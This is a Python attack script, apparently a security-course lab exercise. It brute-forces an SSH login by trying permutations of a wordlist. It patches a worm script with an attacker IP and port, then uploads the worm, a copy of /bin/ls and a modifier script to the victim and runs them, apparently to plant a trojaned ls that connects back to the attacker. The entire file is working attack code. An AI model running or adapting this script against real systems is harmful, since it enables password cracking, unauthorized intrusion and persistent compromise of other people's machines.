#!/usr/bin/env python3

import os
import sys
import time
import socket
import paramiko
from pathlib import Path
from itertools import permutations
import re


def disable_traceback_print():
    sys.tracebacklimit = 0


def get_parameters():
    if len(sys.argv) != 4:
        print(f"usage: {__file__} <Victim IP> <Attacker IP> <Attacker port>")
        exit(-1)
    return sys.argv[1:]


def try_ssh_connect(victim_ip, password):
    username = "csc2024"
    client   = paramiko.SSHClient()                                 
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    
    
    try:
        client.connect(hostname=victim_ip, username=username, password=password, timeout=0.5)
    except Exception:
            print(f"Finding password... {password} is wrong for {username}")
            client.close()
    else:
        print(f"Correct password: The password of {username} is {password}")
        return client

    """except socket.timeout: 
        print(f"[!] Timeout: {victim_ip} is unreachable, password is {password}")
        return False
    except paramiko.ssh_exception.NoValidConnectionsError: 
        print(f"[!] No valid connection: SSH connection cannot be established, password is {password}")
        return False
    except paramiko.AuthenticationException:
        print(f"Finding password... {password} is wrong for {username}")
        return False
    except paramiko.ssh_exception.SSHException as SSHException:
        print(f"[!] SSH Exception: {SSHException}")
        print(f"[!] Quota exceed, retrying with delay ...")
        time.sleep(10)
        return try_ssh_connect(victim_ip, password)"""


def crack_ssh_password(victim_ip):
    home = Path.home()
    pathname = '/app/victim.dat'
    with open(pathname , "r") as file:
        dictionary = file.read().splitlines()
    
    for i in range (1, len(dictionary) + 1):
        for combination in list(permutations(dictionary, i)):
            password = "".join(combination)
            victim = try_ssh_connect(victim_ip, password)
            if victim: return victim
    print(f"Cannot find the correct password")
    exit(-1)


def modify_payload(attacker_ip, attacker_port):
    new_ip = attacker_ip
    new_port = attacker_port

    # Read the content of the script file
    with open("worm.sh", "r") as file:
        script_content = file.read()

    # Use regular expressions to find and replace the IP address and port number
    script_content = re.sub(r'server_ip = "[^"]+"', f'server_ip = "{new_ip}"', script_content)
    script_content = re.sub(r'server_port = \d+', f'server_port = {new_port}', script_content)

    # Write the modified content back to the script file
    with open("worm.sh", "w") as file:
        file.write(script_content)
        file.close()




def upload_worm(victim):
    home = Path.home()
    localpath = 'modify_ls.sh'
    remotepath = '/app/modify_ls.sh'

    t = victim.get_transport()
    sftp = paramiko.SFTPClient.from_transport(t)

    sftp.put('/bin/ls', '/app/ls.orig')
    sftp.put('worm.sh', '/app/worm.sh')
    sftp.put(localpath, remotepath)

    print("New files uploaded.")
    stdin, stdout, stderr = victim.exec_command('chmod +x /app/worm.sh')
    stdin, stdout, stderr = victim.exec_command(f'chmod +x {remotepath}')
    # Read from stdout and stderr to prevent blocking
    stdout.read()
    stderr.read()

    stdin, stdout, stderr = victim.exec_command(f'bash {remotepath}')
    # Read from stdout and stderr to prevent blocking
    stdout.read()
    stderr.read()

    # Check if any errors occurred during execution
    if stderr.channel.recv_exit_status() != 0:
        print("Error occurred while executing the script.")
    else:
        print("Script executed successfully.")
    #stdin, stdout, stderr = victim.exec_command(f'chmod +x {remotepath}')

    sftp.close()


def main():
    disable_traceback_print()
    victim_ip, attacker_ip, attacker_port = get_parameters()
    victim = crack_ssh_password(victim_ip)
    modify_payload(attacker_ip, attacker_port)
    upload_worm(victim)
    victim.close()
        

if __name__ == '__main__':
    main()